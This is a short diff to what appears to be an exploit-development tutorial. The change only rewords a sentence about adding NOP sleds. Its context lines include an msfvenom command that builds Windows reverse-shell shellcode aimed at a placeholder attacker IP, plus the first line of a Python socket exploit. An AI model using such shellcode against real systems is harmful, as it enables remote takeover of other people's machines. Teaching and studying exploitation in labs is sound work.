@@ -244,7 +244,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<MY_ATTACKER_IP> LPORT=443 -f c -a x
 ```
 
 This will create us encoded, bad chars free shellcode in 351 bytes long.
-In addtion to some NOP sleds (\x91) to our exploit:
+Also we will need to add some NOP sleds (\x91) to our exploit:
 
 ```
 import socket
